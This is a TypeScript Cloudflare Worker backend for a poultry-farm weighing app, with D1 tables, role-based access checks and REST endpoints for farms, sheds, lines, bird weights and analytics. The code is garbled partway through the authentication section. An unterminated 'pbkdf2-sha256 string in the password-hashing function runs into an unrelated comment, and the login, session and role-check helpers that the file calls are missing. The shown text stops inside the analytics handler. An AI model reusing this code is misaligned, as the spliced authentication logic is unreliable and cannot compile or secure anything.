/**
 * Cloudflare Worker Full-Stack Controller
 * Native Serverless API with Cloudflare D1 (DB) & Cloudflare R2 (STORAGE_BUCKET)
 */

export interface D1PreparedStatement {
  bind(...values: any[]): D1PreparedStatement;
  first<T = Record<string, any>>(colName?: string): Promise<T | null>;
  run<T = Record<string, any>>(): Promise<{ success: boolean; results?: T[]; meta?: any }>;
  all<T = Record<string, any>>(): Promise<{ success: boolean; results: T[]; meta?: any }>;
}

export interface D1Database {
  prepare(query: string): D1PreparedStatement;
  batch<T = unknown>(statements: D1PreparedStatement[]): Promise<any[]>;
  exec(query: string): Promise<any>;
}

export interface R2Object {
  key: string;
  size: number;
  uploaded: Date;
}

export interface R2Bucket {
  put(key: string, value: any, options?: any): Promise<any>;
  get(key: string): Promise<any>;
  delete(keys: string | string[]): Promise<void>;
  list(options?: any): Promise<{ objects: R2Object[] }>;
}

export interface Env {
  DB?: D1Database;
  STORAGE_BUCKET?: R2Bucket;
  REPORT_BUCKET?: R2Bucket;
  ASSETS?: {
    fetch: (request: Request) => Promise<Response>;
  };
  ENVIRONMENT?: string;
  AUTH_SECRET?: string;
  BOOTSTRAP_ADMIN_USERNAME?: string;
  BOOTSTRAP_ADMIN_PASSWORD?: string;
}

// CORS Helper Headers
const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, PATCH, DELETE, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With',
};

// Strict anti-caching headers for real-time Cloudflare multi-device sync
const NO_CACHE_HEADERS = {
  'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0',
  'Pragma': 'no-cache',
  'Expires': '0',
};

function jsonResponse(data: any, status = 200, extraHeaders: Record<string, string> = {}): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      'Content-Type': 'application/json',
      ...CORS_HEADERS,
      ...NO_CACHE_HEADERS,
      ...extraHeaders,
    },
  });
}

function errorResponse(message: string, status = 400): Response {
  return new Response(JSON.stringify({ error: message, success: false }), {
    status,
    headers: {
      'Content-Type': 'application/json',
      ...CORS_HEADERS,
      ...NO_CACHE_HEADERS,
    },
  });
}

// Ensure shed_week_status table exists in D1 database for Stage 2 shed-wise saves
async function ensureShedWeekStatusTable(env: Env): Promise<void> {
  if (!env.DB) return;
  try {
    await env.DB.prepare(`
      CREATE TABLE IF NOT EXISTS shed_week_status (
        shed_id TEXT NOT NULL,
        farm_id TEXT NOT NULL,
        week TEXT NOT NULL,
        status TEXT NOT NULL DEFAULT 'SAVED',
        saved_by_user_id TEXT,
        saved_by_user_name TEXT,
        total_bird_count INTEGER DEFAULT 0,
        weights_json TEXT,
        batch_id TEXT,
        saved_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        PRIMARY KEY (shed_id, week)
      )
    `).run().catch(() => {});
    await env.DB.prepare(`
      CREATE INDEX IF NOT EXISTS idx_shed_week_status ON shed_week_status(farm_id, week)
    `).run().catch(() => {});
    // Auto-migrate schema: ensure weights_json and batch_id exist if table already existed
    await env.DB.prepare(`ALTER TABLE shed_week_status ADD COLUMN weights_json TEXT`).run().catch(() => {});
    await env.DB.prepare(`ALTER TABLE shed_week_status ADD COLUMN batch_id TEXT`).run().catch(() => {});
  } catch (err) {
    console.error('ensureShedWeekStatusTable error:', err);
  }
}

// Ensure sheds table has real-time lock tracking columns
async function ensureShedLockColumns(env: Env): Promise<void> {
  if (!env.DB) return;
  try {
    await env.DB.prepare(`ALTER TABLE sheds ADD COLUMN locked_week TEXT`).run().catch(() => {});
    await env.DB.prepare(`ALTER TABLE sheds ADD COLUMN locked_batch_id TEXT`).run().catch(() => {});
  } catch (err) {}
}

// Ensure batches table exists in D1 database for Farm -> Batch -> Week hierarchy
async function ensureBatchesTable(env: Env): Promise<void> {
  if (!env.DB) return;
  try {
    await env.DB.prepare(`
      CREATE TABLE IF NOT EXISTS batches (
        id TEXT PRIMARY KEY,
        farm_id TEXT NOT NULL,
        batch_name TEXT NOT NULL,
        start_date TEXT NOT NULL,
        start_week_number INTEGER NOT NULL DEFAULT 1,
        status TEXT CHECK(status IN ('ACTIVE', 'COMPLETED')) NOT NULL DEFAULT 'ACTIVE',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `).run().catch(() => {});
    await env.DB.prepare(`CREATE INDEX IF NOT EXISTS idx_batches_farm ON batches(farm_id)`).run().catch(() => {});
  } catch (err) {
    console.error('ensureBatchesTable error:', err);
  }
}

// Ensure users table exists, auto-migrate SUPERVISOR to INCHARGE, and sequentially assign EMP0001.. codes
async function ensureUsersTable(env: Env): Promise<void> {
  if (!env.DB) return;
  try {
    await env.DB.prepare(`
      CREATE TABLE IF NOT EXISTS users (
        id TEXT PRIMARY KEY,
        name TEXT NOT NULL,
        phone_or_email TEXT UNIQUE NOT NULL,
        role TEXT NOT NULL,
        employee_code TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `).run().catch(() => {});
    await env.DB.prepare(`ALTER TABLE users ADD COLUMN employee_code TEXT`).run().catch(() => {});
    await env.DB.prepare(`ALTER TABLE users ADD COLUMN assigned_farm_id TEXT`).run().catch(() => {});
    await env.DB.prepare(`ALTER TABLE users ADD COLUMN assigned_farms TEXT`).run().catch(() => {});
    await env.DB.prepare(`ALTER TABLE users ADD COLUMN password_hash TEXT`).run().catch(() => {});
    await env.DB.prepare(`ALTER TABLE users ADD COLUMN status TEXT NOT NULL DEFAULT 'ACTIVE'`).run().catch(() => {});
    await env.DB.prepare(`ALTER TABLE users ADD COLUMN requires_password_change INTEGER NOT NULL DEFAULT 0`).run().catch(() => {});

    // Sequential EMP codes (EMP0001, EMP0002, ...) for all users
    const usersRes = await env.DB.prepare(`SELECT id, employee_code FROM users ORDER BY created_at ASC, rowid ASC`).all().catch(() => ({ results: [] }));
    const users = (usersRes.results || []) as any[];
    let currentMax = 0;
    for (const u of users) {
      if (u.employee_code && String(u.employee_code).toUpperCase().startsWith('EMP')) {
        const n = parseInt(String(u.employee_code).replace(/\D/g, ''), 10);
        if (!isNaN(n) && n > currentMax) currentMax = n;
      }
    }
    for (const u of users) {
      if (!u.employee_code) {
        currentMax++;
        const nextCode = `EMP${String(currentMax).padStart(4, '0')}`;
        await env.DB.prepare(`UPDATE users SET employee_code = ? WHERE id = ?`).bind(nextCode, u.id).run().catch(() => {});
      }
    }
  } catch (err) {
    console.error('ensureUsersTable error:', err);
  }
}


type WorkerRole = 'Admin' | 'Manager' | 'In-Charge' | 'Supervisor';
type WorkerUser = {
  id: string; username: string; name: string; role: WorkerRole; status: string;
  assignedFarms: string[]; assignedFarmId?: string; employeeCode?: string;
  requiresPasswordChange: boolean;
};
const AUTH_ENCODER = new TextEncoder();
const PASSWORD_HASH_ITERATIONS = 120000;
const TOKEN_TTL_SECONDS = 7 * 24 * 60 * 60;

function bytesToHex(bytes: Uint8Array): string {
  return Array.from(bytes, b => b.toString(16).padStart(2, '0')).join('');
}
function hexToBytes(hex: string): Uint8Array {
  if (!/^(?:[0-9a-f]{2})+$/i.test(hex)) return new Uint8Array();
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < bytes.length; i++) bytes[i] = parseInt(hex.slice(i * 2, i * 2 + 2), 16);
  return bytes;
}
function base64UrlEncode(bytes: Uint8Array): string {
  let binary = '';
  for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
  return btoa(binary).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
}
function base64UrlDecode(value: string): Uint8Array {
  try {
    const normalized = value.replace(/-/g, '+').replace(/_/g, '/');
    const padded = normalized + '='.repeat((4 - normalized.length % 4) % 4);
    const binary = atob(padded);
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
    return bytes;
  } catch { return new Uint8Array(); }
}
function constantTimeEqual(left: string, right: string): boolean {
  if (left.length !== right.length) return false;
  let mismatch = 0;
  for (let i = 0; i < left.length; i++) mismatch |= left.charCodeAt(i) ^ right.charCodeAt(i);
  return mismatch === 0;
}
function getAuthSecret(env: Env): string | null {
  const secret = env.AUTH_SECRET || '';
  return secret.length >= 32 ? secret : null;
}
async function derivePasswordHash(password: string, salt: Uint8Array, iterations: number): Promise<Uint8Array> {
  const key = await crypto.subtle.importKey('raw', AUTH_ENCODER.encode(password), 'PBKDF2', false, ['deriveBits']);
  const bits = await crypto.subtle.deriveBits({ name: 'PBKDF2', salt, iterations, hash: 'SHA-256' }, key, 256);
  return new Uint8Array(bits);
}
async function makePasswordHash(password: string): Promise<string> {
  const salt = crypto.getRandomValues(new Uint8Array(16));
  const hash = await derivePasswordHash(password, salt, PASSWORD_HASH_ITERATIONS);
  return 'pbkdf2-sha256 (auto-migrating existing records to Batch 1 if none exists)
async function ensureFarmActiveBatch(env: Env, farm: any): Promise<any> {
  if (!env.DB || !farm) return null;
  await ensureBatchesTable(env);
  let activeBatch = await env.DB.prepare(
    'SELECT * FROM batches WHERE farm_id = ? AND status = ? ORDER BY created_at DESC LIMIT 1'
  ).bind(farm.id, 'ACTIVE').first() as any;

  if (!activeBatch) {
    const existing = await env.DB.prepare(
      'SELECT * FROM batches WHERE farm_id = ? ORDER BY created_at DESC LIMIT 1'
    ).bind(farm.id).first() as any;

    if (!existing) {
      const batchId = `batch-${farm.id}-1`;
      const batchName = 'Batch 1';
      const startDate = farm.flock_date || new Date().toISOString().split('T')[0];
      const startWeekNum = parseInt(String(farm.age_week || 'W1').replace(/\D/g, '') || '1', 10);

      await env.DB.prepare(`
        INSERT INTO batches (id, farm_id, batch_name, start_date, start_week_number, status)
        VALUES (?, ?, ?, ?, ?, 'ACTIVE')
      `).bind(batchId, farm.id, batchName, startDate, startWeekNum).run().catch(() => {});

      // Link any legacy unassigned records to Batch 1
      await env.DB.prepare(
        'UPDATE bird_weights SET batch_id = ? WHERE batch_id IS NULL'
      ).bind(batchId).run().catch(() => {});
      await env.DB.prepare(
        'UPDATE shed_week_status SET batch_id = ? WHERE batch_id IS NULL AND farm_id = ?'
      ).bind(batchId, farm.id).run().catch(() => {});
      await env.DB.prepare(
        'UPDATE submissions SET batch_id = ?, batch_name = ? WHERE batch_id IS NULL AND farm_id = ?'
      ).bind(batchId, batchName, farm.id).run().catch(() => {});

      activeBatch = {
        id: batchId,
        farm_id: farm.id,
        farmId: farm.id,
        batch_name: batchName,
        batchName: batchName,
        start_date: startDate,
        startDate: startDate,
        start_week_number: startWeekNum,
        startWeekNumber: startWeekNum,
        status: 'ACTIVE',
      };
    } else {
      activeBatch = existing;
    }
  }

  return {
    id: activeBatch.id,
    farmId: activeBatch.farm_id || farm.id,
    batchName: activeBatch.batch_name || activeBatch.batchName || 'Batch 1',
    startDate: activeBatch.start_date || activeBatch.startDate || farm.flock_date,
    startWeekNumber: activeBatch.start_week_number || activeBatch.startWeekNumber || 1,
    status: activeBatch.status,
  };
}

export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    const url = new URL(request.url);
    const method = request.method.toUpperCase();

    // 1. Handle CORS Preflight Requests
    if (method === 'OPTIONS') {
      return new Response(null, {
        status: 204,
        headers: CORS_HEADERS,
      });
    }

    // Health check endpoint (Direct /health)
    if (url.pathname === '/health' || url.pathname === '/health/') {
      return jsonResponse({
        status: 'ok',
        connected: true,
        database: { status: 'connected', provider: 'cloudflare-d1' },
      });
    }

    // 2. Handle API Routes under /api/
    if (url.pathname.startsWith('/api')) {
      try {
        const path = url.pathname.replace(/^\/api/, '') || '/';

        // Health check endpoint: GET /api/health
        if (path === '/health' || path === '/health/') {
          return jsonResponse({
            status: 'ok',
            connected: true,
            database: { status: 'connected', provider: 'cloudflare-d1' },
          });
        }

        // Authentication gate: only health and credential login are public.
        if (path === '/auth/login' && method === 'POST') return await handleWorkerLogin(env, request);
        if (path === '/auth/me' && method === 'GET') {
          const sessionUser = await getWorkerSession(env, request);
          if (!sessionUser) return errorResponse('Session expired or invalid. Please log in again.', getAuthSecret(env) ? 401 : 503);
          return jsonResponse({ user: { ...sessionUser, isAuthenticated: true } });
        }
        const session = await getWorkerSession(env, request);
        if (!session) return errorResponse('Authentication required. Please log in.', getAuthSecret(env) ? 401 : 503);

        const isUserManagement = /^\/(?:auth\/)?users(?:\/|$)/.test(path) ||
          path === '/auth/next-employee-code' || path === '/auth/next-employee-code/';
        if (isUserManagement && !workerRoleIsManager(session)) {
          return errorResponse('Access denied. Only Admin or Manager accounts can manage users.', 403);
        }
        if (path === '/farms' && method === 'POST' && !workerRoleIsManager(session)) {
          return errorResponse('Access denied. Only Admin or Manager accounts can create farms.', 403);
        }
        if ((method === 'DELETE' && /^\/farms\/[^/]+\/?$/.test(path)) ||
            /^\/farms\/[^/]+\/(?:archive|restore)$/.test(path)) {
          if (session.role !== 'Admin') return errorResponse('Access denied. Only Admin accounts can delete, archive, or restore farms.', 403);
        }
        if ((path.startsWith('/admin/') || path === '/admin' || path.startsWith('/analytics') ||
             path.startsWith('/reports') || path.startsWith('/export/reports')) && !workerRoleIsManager(session)) {
          return errorResponse('Access denied. Manager permissions are required for this operation.', 403);
        }
        const scopedBody = ['POST', 'PUT', 'PATCH', 'DELETE'].includes(method)
          ? await request.clone().json().catch(() => ({})) as any
          : {};
        const farmScope = await resolveFarmIdForRequest(env, path, url.searchParams, scopedBody);
        if (farmScope && !workerCanAccessFarm(session, farmScope.farmId, farmScope.farmName)) {
          return errorResponse('Access denied. Your account is not assigned to this farm.', 403);
        }
        if (path === '/auth/change-password' && method === 'POST') {
          return await handleWorkerPasswordChange(env, request, session);
        }

        // -------------------------------------------------------------
        // A. HIERARCHY ENDPOINTS: GET /api/hierarchy, POST /api/hierarchy
        // -------------------------------------------------------------
        if (path === '/hierarchy' || path === '/hierarchy/') {
          if (method === 'GET') {
            const farmId = url.searchParams.get('farmId');
            if (!env.DB) {
              return jsonResponse({
                farms: [],
                message: 'D1 binding not initialized yet in local test mode.',
              });
            }

            const farmQuery = farmId
              ? await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).all()
              : await env.DB.prepare('SELECT * FROM farms WHERE is_archived = 0 ORDER BY created_at DESC').all();

            const farms = ((farmQuery.results || []) as any[]).filter((f: any) => workerCanAccessFarm(session, String(f.id), String(f.name || '')));
            const fullHierarchy: any[] = [];

            for (const f of farms) {
              const shedsRes = await env.DB.prepare('SELECT * FROM sheds WHERE farm_id = ?').bind(f.id).all();
              const sheds = shedsRes.results || [];
              const shedList: any[] = [];

              for (const s of sheds) {
                const partsRes = await env.DB.prepare('SELECT * FROM parts WHERE shed_id = ?').bind(s.id).all();
                const parts = partsRes.results || [];
                const partList: any[] = [];

                for (const p of parts) {
                  const linesRes = await env.DB.prepare(
                    'SELECT * FROM lines WHERE part_id = ? ORDER BY line_number ASC'
                  ).bind(p.id).all();
                  const lines = linesRes.results || [];
                  const lineList: any[] = [];

                  for (const l of lines) {
                    const weightsRes = await env.DB.prepare(
                      'SELECT weight_grams FROM bird_weights WHERE line_id = ? ORDER BY entry_index ASC'
                    ).bind(l.id).all();
                    const weights = (weightsRes.results || []).map((w: any) => w.weight_grams);

                    lineList.push({
                      id: l.id,
                      name: l.name,
                      lineNumber: l.line_number,
                      gender: l.gender, // 'MALE' | 'FEMALE'
                      stdWeight: l.std_weight_grams,
                      targetBirdCount: l.target_bird_count,
                      weights,
                    });
                  }

                  partList.push({
                    id: p.id,
                    name: p.name,
                    lines: lineList,
                  });
                }

                shedList.push({
                  id: s.id,
                  name: s.name,
                  targetBirdCount: s.target_bird_count,
                  lockedByUserId: s.locked_by_user_id || null,
                  lockedByUserName: s.locked_by_user_name || null,
                  lockedAt: s.locked_at || null,
                  lastHeartbeatAt: s.last_heartbeat_at || null,
                  recordedByUserId: s.recorded_by_user_id || null,
                  recordedByUserName: s.recorded_by_user_name || null,
                  parts: partList,
                });
              }

              fullHierarchy.push({
                ...f,
                sheds: shedList,
              });
            }

            return jsonResponse({ success: true, farms: fullHierarchy });
          }

          if (method === 'POST') {
            const body = await request.json().catch(() => ({})) as any;
            if (!env.DB) return jsonResponse({ success: true, message: 'D1 not bound' });

            const farmId = body.farmId || `farm-${Date.now()}`;
            const farmName = body.name || 'New Farm';
            const season = body.season || 'Summer';
            const ageWeek = body.ageWeek || 'W1';

            await env.DB.prepare(
              'INSERT INTO farms (id, name, season, age_week, flock_date) VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP) ON CONFLICT(id) DO UPDATE SET name=excluded.name, updated_at=CURRENT_TIMESTAMP'
            ).bind(farmId, farmName, season, ageWeek).run();

            return jsonResponse({ success: true, farmId });
          }
        }

        // -------------------------------------------------------------
        // B0. PARTS ENDPOINTS (POST /api/parts, PUT /api/parts/:id, DELETE /api/parts/:id)
        // -------------------------------------------------------------
        if ((path === '/parts' || path === '/parts/') && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const shedId = body.shedId || body.shed_id;
          const name = (body.name || 'Part A').trim();
          if (!shedId) return errorResponse('Missing shedId', 400);

          const partId = `part-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;
          if (env.DB) {
            await env.DB.prepare(
              'INSERT INTO parts (id, shed_id, name) VALUES (?, ?, ?)'
            ).bind(partId, shedId, name).run().catch((err) => {
              console.error('Error adding part:', err);
            });
          }

          return jsonResponse({ id: partId, shedId, name, lines: [] }, 201);
        }

        const singlePartMatch = path.match(/^\/parts\/([^/]+)$/);
        if (singlePartMatch && method === 'PUT') {
          const partId = decodeURIComponent(singlePartMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const name = (body.name || '').trim();
          if (env.DB && name) {
            await env.DB.prepare('UPDATE parts SET name = ? WHERE id = ?').bind(name, partId).run().catch(() => {});
          }
          return jsonResponse({ success: true, message: 'Part updated' });
        }

        if (singlePartMatch && method === 'DELETE') {
          const partId = decodeURIComponent(singlePartMatch[1]);
          if (env.DB) {
            await env.DB.prepare('DELETE FROM bird_weights WHERE line_id IN (SELECT id FROM lines WHERE part_id = ?)').bind(partId).run().catch(() => {});
            await env.DB.prepare('DELETE FROM lines WHERE part_id = ?').bind(partId).run().catch(() => {});
            await env.DB.prepare('DELETE FROM parts WHERE id = ?').bind(partId).run().catch(() => {});
          }
          return jsonResponse({ success: true, message: 'Part deleted' });
        }

        // -------------------------------------------------------------
        // B1. LINES ENDPOINTS (POST /api/lines, PUT /api/lines/:id, DELETE /api/lines/:id)
        // -------------------------------------------------------------
        if ((path === '/lines' || path === '/lines/') && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const partId = body.partId || body.part_id;
          if (!partId) return errorResponse('Missing partId', 400);

          let lineNum = body.lineNumber;
          if (!lineNum && env.DB) {
            const countRes = await env.DB.prepare('SELECT COUNT(*) as count FROM lines WHERE part_id = ?').bind(partId).first() as any;
            lineNum = (countRes?.count || 0) + 1;
          } else if (!lineNum) {
            lineNum = 1;
          }

          const lineName = body.name || `Line ${lineNum}`;
          const gender = (body.gender || 'MALE').toUpperCase() === 'FEMALE' ? 'FEMALE' : 'MALE';
          const lineId = `line-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;

          if (env.DB) {
            await env.DB.prepare(`
              INSERT INTO lines (id, part_id, line_number, name, gender, std_weight_grams, target_bird_count)
              VALUES (?, ?, ?, ?, ?, 140, 50)
            `).bind(lineId, partId, lineNum, lineName, gender).run().catch((err) => {
              console.error('Error adding line:', err);
            });
          }

          return jsonResponse({ id: lineId, partId, lineNumber: lineNum, name: lineName, gender, weights: [] }, 201);
        }

        const singleLineMatch = path.match(/^\/lines\/([^/]+)$/);
        if (singleLineMatch && method === 'PUT') {
          const lineId = decodeURIComponent(singleLineMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          if (!env.DB) return errorResponse('User database is unavailable.', 503);
          if (env.DB) {
            if (body.name) {
              await env.DB.prepare('UPDATE lines SET name = ? WHERE id = ?').bind(body.name, lineId).run().catch(() => {});
            }
            if (body.gender) {
              const g = body.gender.toUpperCase() === 'FEMALE' ? 'FEMALE' : 'MALE';
              await env.DB.prepare('UPDATE lines SET gender = ? WHERE id = ?').bind(g, lineId).run().catch(() => {});
            }
          }
          return jsonResponse({ success: true, message: 'Line updated' });
        }

        if (singleLineMatch && method === 'DELETE') {
          const lineId = decodeURIComponent(singleLineMatch[1]);
          if (env.DB) {
            const line = await env.DB.prepare('SELECT part_id FROM lines WHERE id = ?').bind(lineId).first() as any;
            await env.DB.prepare('DELETE FROM bird_weights WHERE line_id = ?').bind(lineId).run().catch(() => {});
            await env.DB.prepare('DELETE FROM lines WHERE id = ?').bind(lineId).run().catch(() => {});

            // Auto-reindex remaining lines in that part sequentially from Line 1
            if (line?.part_id) {
              const remRes = await env.DB.prepare('SELECT id FROM lines WHERE part_id = ? ORDER BY line_number ASC, rowid ASC').bind(line.part_id).all().catch(() => ({ results: [] }));
              const remLines = (remRes.results || []) as any[];
              for (let i = 0; i < remLines.length; i++) {
                const nextNum = i + 1;
                await env.DB.prepare('UPDATE lines SET line_number = ?, name = ? WHERE id = ?').bind(nextNum, `Line ${nextNum}`, remLines[i].id).run().catch(() => {});
              }
            }
          }
          return jsonResponse({ success: true, message: 'Line deleted' });
        }

        // -------------------------------------------------------------
        // B. LINE GENDER ENDPOINT: PATCH /api/lines/:id/gender
        // -------------------------------------------------------------
        const lineGenderMatch = path.match(/^\/lines\/([^/]+)\/gender$/);
        if (lineGenderMatch && method === 'PATCH') {
          const lineId = decodeURIComponent(lineGenderMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const gender = (body.gender || '').toUpperCase();

          if (gender !== 'MALE' && gender !== 'FEMALE') {
            return errorResponse('Invalid gender. Must be MALE or FEMALE', 400);
          }

          if (!env.DB) {
            return jsonResponse({ success: true, lineId, gender, note: 'Simulated D1 mode' });
          }

          // Fetch flock age/week to look up new STD
          const lineInfo = await env.DB.prepare(`
            SELECT l.id, l.name, l.part_id, f.flock_age_days, f.age_week
            FROM lines l
            JOIN parts p ON l.part_id = p.id
            JOIN sheds s ON p.shed_id = s.id
            JOIN farms f ON s.farm_id = f.id
            WHERE l.id = ?
          `).bind(lineId).first() as any;

          let stdWeight = gender === 'MALE' ? 150 : 140;
          if (lineInfo) {
            const weekNum = parseInt(String(lineInfo.age_week || 'W1').replace(/\D/g, '') || '1', 10);
            const stdLookup = await env.DB.prepare(
              'SELECT std_weight_grams FROM standard_weights WHERE age_week = ? AND gender = ?'
            ).bind(weekNum, gender).first() as any;
            if (stdLookup && stdLookup.std_weight_grams) {
              stdWeight = stdLookup.std_weight_grams;
            }
          }

          await env.DB.prepare(
            'UPDATE lines SET gender = ?, std_weight_grams = ? WHERE id = ?'
          ).bind(gender, stdWeight, lineId).run();

          return jsonResponse({
            success: true,
            lineId,
            gender,
            stdWeightGrams: stdWeight,
            message: `Line gender updated to ${gender} with STD ${stdWeight}g`,
          });
        }

        // -------------------------------------------------------------
        // C. WEIGHTS ENDPOINTS: POST /api/weights, DELETE /api/weights
        // -------------------------------------------------------------
        if (path === '/weights' || path === '/weights/') {
          if (method === 'POST') {
            const body = await request.json().catch(() => ({})) as any;
            const { lineId, weight, entryIndex, recordedBy, week } = body;

            if (!lineId || weight === undefined || weight === null) {
              return errorResponse('Missing required fields: lineId and weight', 400);
            }

            const weightGrams = Number(weight);
            if (isNaN(weightGrams) || weightGrams <= 0) {
              return errorResponse('Weight must be a positive number', 400);
            }

            if (!env.DB) {
              return jsonResponse({ success: true, id: `w-${Date.now()}`, weightGrams });
            }

            // Get current line STD
            const line = await env.DB.prepare('SELECT std_weight_grams, gender FROM lines WHERE id = ?').bind(lineId).first() as any;
            const stdWeightAtEntry = line?.std_weight_grams || 140;

            const countRes = await env.DB.prepare('SELECT COUNT(*) as count FROM bird_weights WHERE line_id = ?').bind(lineId).first() as any;
            const finalIndex = entryIndex !== undefined ? entryIndex : (countRes?.count || 0) + 1;
            const weightId = `w-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;

            await env.DB.prepare(
              'INSERT INTO bird_weights (id, line_id, entry_index, weight_grams, std_weight_at_entry, recorded_by, week) VALUES (?, ?, ?, ?, ?, ?, ?)'
            ).bind(weightId, lineId, finalIndex, weightGrams, stdWeightAtEntry, recordedBy || 'Operator', week || 'W1').run();

            return jsonResponse({
              success: true,
              id: weightId,
              lineId,
              entryIndex: finalIndex,
              weightGrams,
              stdWeightAtEntry,
            });
          }

          if (method === 'DELETE') {
            const body = await request.json().catch(() => ({})) as any;
            const { id, lineId, index, clearAll } = body;

            if (!env.DB) return jsonResponse({ success: true });

            if (clearAll && lineId) {
              await env.DB.prepare('DELETE FROM bird_weights WHERE line_id = ?').bind(lineId).run();
              return jsonResponse({ success: true, message: `Cleared all weights in line ${lineId}` });
            }

            if (id) {
              await env.DB.prepare('DELETE FROM bird_weights WHERE id = ?').bind(id).run();
              return jsonResponse({ success: true, message: `Deleted weight ${id}` });
            }

            if (lineId && index !== undefined) {
              // Delete by line and order index
              const target = await env.DB.prepare(
                'SELECT id FROM bird_weights WHERE line_id = ? ORDER BY entry_index ASC LIMIT 1 OFFSET ?'
              ).bind(lineId, index).first() as any;

              if (target?.id) {
                await env.DB.prepare('DELETE FROM bird_weights WHERE id = ?').bind(target.id).run();
              }
              return jsonResponse({ success: true, message: `Deleted weight at index ${index}` });
            }

            return errorResponse('Specify weight id, clearAll, or lineId and index', 400);
          }
        }

        // Sub-routes for weights on lines:
        // POST /api/lines/:id/weight
        // DELETE /api/lines/:id/weight/:index
        // POST /api/lines/:id/clear
        const lineWeightMatch = path.match(/^\/lines\/([^/]+)\/weight$/);
        if (lineWeightMatch && method === 'POST') {
          const lineId = decodeURIComponent(lineWeightMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const weightGrams = Number(body.weight);

          if (!env.DB) return jsonResponse({ success: true, weight: weightGrams });

          const line = await env.DB.prepare('SELECT std_weight_grams FROM lines WHERE id = ?').bind(lineId).first() as any;
          const stdWeightAtEntry = line?.std_weight_grams || 140;
          const countRes = await env.DB.prepare('SELECT COUNT(*) as count FROM bird_weights WHERE line_id = ?').bind(lineId).first() as any;
          const nextIndex = (countRes?.count || 0) + 1;
          const weightId = `w-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;

          await env.DB.prepare(
            'INSERT INTO bird_weights (id, line_id, entry_index, weight_grams, std_weight_at_entry, recorded_by, week) VALUES (?, ?, ?, ?, ?, ?, ?)'
          ).bind(weightId, lineId, nextIndex, weightGrams, stdWeightAtEntry, body.userName || 'Operator', body.week || 'W1').run();

          return jsonResponse({ success: true, id: weightId, weight: weightGrams });
        }

        const lineDeleteWeightMatch = path.match(/^\/lines\/([^/]+)\/weight\/(\d+)$/);
        if (lineDeleteWeightMatch && method === 'DELETE') {
          const lineId = decodeURIComponent(lineDeleteWeightMatch[1]);
          const index = parseInt(lineDeleteWeightMatch[2], 10);

          if (!env.DB) return jsonResponse({ success: true });

          const target = await env.DB.prepare(
            'SELECT id FROM bird_weights WHERE line_id = ? ORDER BY entry_index ASC LIMIT 1 OFFSET ?'
          ).bind(lineId, index).first() as any;

          if (target?.id) {
            await env.DB.prepare('DELETE FROM bird_weights WHERE id = ?').bind(target.id).run();
          }

          return jsonResponse({ success: true });
        }

        const lineClearMatch = path.match(/^\/lines\/([^/]+)\/clear$/);
        if (lineClearMatch && method === 'POST') {
          const lineId = decodeURIComponent(lineClearMatch[1]);
          if (env.DB) {
            await env.DB.prepare('DELETE FROM bird_weights WHERE line_id = ?').bind(lineId).run();
          }
          return jsonResponse({ success: true, message: `Weights cleared for line ${lineId}` });
        }

        // -------------------------------------------------------------
        // D. ADMIN ANALYTICS ENDPOINT: GET /api/admin/analytics
        // Computes AVG WT, STD, Uniformity %, CV % dynamically per Line Gender
        // -------------------------------------------------------------
        if ((path === '/admin/analytics' || path === '/admin/analytics/') && method === 'GET') {
          const farmId = url.searchParams.get('farmId');
          if (!env.DB) {
            return jsonResponse({
              analytics: {
                totalBirds: 0,
                femaleAvg: 0,
                maleAvg: 0,
                femaleUniformity: 0,
                maleUniformity: 0,
                linesBreakdown: [],
              },
            });
          }

          const linesQuery = farmId
            ? await env.DB.prepare(`
                SELECT l.id, l.name as line_name, l.gender, l.std_weight_grams,
                       s.id as shed_id, s.name as shed_name,
                       p.id as part_id, p.name as part_name
                FROM lines l
                JOIN parts p ON l.part_id = p.id
                JOIN sheds s ON p.shed_id = s.id
                WHERE s.farm_id = ?
                ORDER BY s.name, p.name, l.line_number
              `).bind(farmId).all()
            : await env.DB.prepare(`
                SELECT l.id, l.name as line_name, l.gender, l.std_weight_grams,
                       s.id as shed_id, s.name as shed_name,
                       p.id as part_id, p.name as part_name
                FROM lines l
                JOIN parts p ON l.part_id = p.id
                JOIN sheds s ON p.shed_id = s.id
                ORDER BY s.name, p.name, l.line_number
              `).all();

          const allLines = linesQuery.results || [];
          const linesBreakdown: any[] = [];

          let allFemaleWeights: number[] = [];
          let allMaleWeights: number[] = [];

          for (const l of allLines) {
            const weightsRes = await env.DB.prepare(
              'SELECT weight_grams FROM bird_weights WHERE line_id = ?'
            ).bind(l.id).all();
            const weights = (weightsRes.results || []).map((w: any) => Number(w.weight_grams));

            const count = weights.length;
            const sum = weights.reduce((a: number, b: number) => a + b, 0);
            const avg = count > 0 ? Math.round((sum / count) * 10) / 10 : 0;
            const std = l.std_weight_grams || (l.gender === 'MALE' ? 150 : 140);

            // Uniformity: percentage within std ± 10%
            const lowerBand = std * 0.9;
            const upperBand = std * 1.1;
            const inRangeCount = count > 0 ? weights.filter((w: number) => w >= lowerBand && w <= upperBand).length : 0;
